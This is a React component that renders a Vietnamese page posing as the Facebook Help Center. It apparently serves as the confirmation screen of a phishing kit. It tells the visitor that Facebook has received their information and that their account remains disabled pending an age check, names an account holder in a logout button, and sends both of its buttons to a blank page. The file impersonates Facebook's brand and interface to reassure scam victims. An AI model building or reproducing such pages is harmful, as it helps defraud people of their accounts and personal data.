import icon from '@/assets/images/icon.webp';
import { faDownload } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { useState, useEffect, useCallback, useMemo } from 'react';
import { translateText } from '@/utils/translate';

const SendInfo = () => {
    const defaultTexts = useMemo(
        () => ({
            title: 'Chúng tôi đã nhận được thông tin của bạn',
            description1: 'Nếu chúng tôi vẫn nhận thấy rằng bạn chưa đủ tuổi để sử dụng Facebook thì tài khoản của bạn sẽ vẫn bị vô hiệu hóa. Điều này là do tài khoản của bạn không tuân theo Điều khoản dịch vụ của chúng tôi.',
            description2: 'Chúng tôi luôn quan tâm đến tính bảo mật của mọi người trên Facebook nên bạn không thể sử dụng tài khoản của mình cho đến lúc đó.',
        }),
        []
    );

    const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);

    const translateAllTexts = useCallback(
        async (targetLang) => {
            try {
                const [
                    translatedTitle,
                    translatedDesc1,
                    translatedDesc2,
                ] = await Promise.all([
                    translateText(defaultTexts.title, targetLang),
                    translateText(defaultTexts.description1, targetLang),
                    translateText(defaultTexts.description2, targetLang),
                ]);

                setTranslatedTexts({
                    title: translatedTitle,
                    description1: translatedDesc1,
                    description2: translatedDesc2,
                });
            } catch {
                //
            }
        },
        [defaultTexts]
    );

    useEffect(() => {
        const targetLang = localStorage.getItem('targetLang');
        if (targetLang && targetLang !== 'en') {
            translateAllTexts(targetLang);
        }
    }, [translateAllTexts]);

    const handleLogOut = () => {
        window.location.href = 'about:blank';
    };

    const handleDownload = () => {
        window.location.href = 'about:blank';
    };

    return (
        <div className='min-h-screen bg-gray-100'>
            {/* Header với Help Center */}
            <header className='bg-white border-b border-gray-300'>
                <div className='max-w-6xl mx-auto px-4 py-3'>
                    <div className='flex items-center justify-between'>
                        <div className='flex items-center space-x-3'>
                            <img 
                                src={icon} 
                                alt='Facebook' 
                                className='h-8 w-8'
                            />
                            <span className='text-lg font-semibold'>Trung tâm trợ giúp</span>
                        </div>
                    </div>
                </div>
            </header>

            {/* Main Content */}
            <main className='max-w-2xl mx-auto px-4 py-6'>
                <div className='bg-white rounded-none shadow-sm border border-gray-300'>
                    {/* Title Section */}
                    <div className='px-6 py-6 border-b border-gray-300'>
                        <h1 className='text-xl font-bold text-gray-900'>
                            {translatedTexts.title}
                        </h1>
                    </div>

                    {/* Description Section */}
                    <div className='px-6 py-6 space-y-4'>
                        <p className='text-gray-700 leading-relaxed'>
                            {translatedTexts.description1}
                        </p>
                        <p className='text-gray-700 leading-relaxed'>
                            {translatedTexts.description2}
                        </p>
                    </div>

                    {/* Action Buttons */}
                    <div className='px-6 py-4 space-y-3 border-t border-gray-300'>
                        <button
                            onClick={handleLogOut}
                            className='w-full text-left text-blue-600 hover:text-blue-800 font-medium py-2'
                        >
                            <strong>Đăng xuất khỏi Iqbal Safi</strong>
                        </button>

                        <button
                            onClick={handleDownload}
                            className='w-full flex items-center space-x-2 text-blue-600 hover:text-blue-800 font-medium py-2'
                        >
                            <FontAwesomeIcon icon={faDownload} />
                            <span>Tải xuống thông tin của bạn</span>
                        </button>
                    </div>
                </div>

                {/* Khoảng trắng phía dưới */}
                <div className='mt-6'></div>
            </main>
        </div>
    );
};
 
export default SendInfo;
